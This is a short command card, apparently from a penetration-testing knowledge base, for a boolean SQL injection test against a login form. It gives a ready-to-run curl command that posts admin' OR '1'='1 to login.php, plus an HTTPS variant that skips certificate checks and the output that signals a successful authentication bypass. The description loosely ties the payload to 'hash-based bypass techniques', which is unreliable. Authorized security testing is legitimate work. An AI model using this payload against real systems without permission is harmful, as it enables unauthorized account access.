---
type: command
executor: bash
data: >-
  curl -X POST -d "username=admin' OR '1'='1" -d "password=test"
  $_TARGET_URL/login.php
output: null
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - web
tags:
  - sql-injection
  - testing
verified: true
validated: true
---

# boolean-sql-injection-test

## Command

```bash
curl -X POST -d "username=admin' OR '1'='1" -d "password=test" $_TARGET_URL/login.php
```

## Description

This command tests for boolean-based SQL injection in a login form by injecting an OR 1=1 payload into the username field. It helps confirm if the application constructs SQL dynamically, making it vulnerable to hash-based bypass techniques.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Full URL of the login endpoint (e.g., http://target.com) | Yes |
| username | Target username field value with payload | Yes |
| password | Dummy password value | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d "username=admin' OR '1'='1" -d "password=test" http://target.com/login.php
```

### With Headers for HTTPS

```bash
curl -X POST -k -d "username=admin' OR '1'='1" -d "password=test" https://target.com/login.php
```

## Expected Output

HTTP 200 or 302 redirect with success indicators like "Welcome Admin" in body or Set-Cookie: session=admin_token. Failure shows error like "Invalid credentials".

## Related

- [[procedures/SQL-Injection-Authentication-Bypass-Using-Raw-MD5-and-SHA1-Hashes]]
- [[perform-login-bypass-submission]]
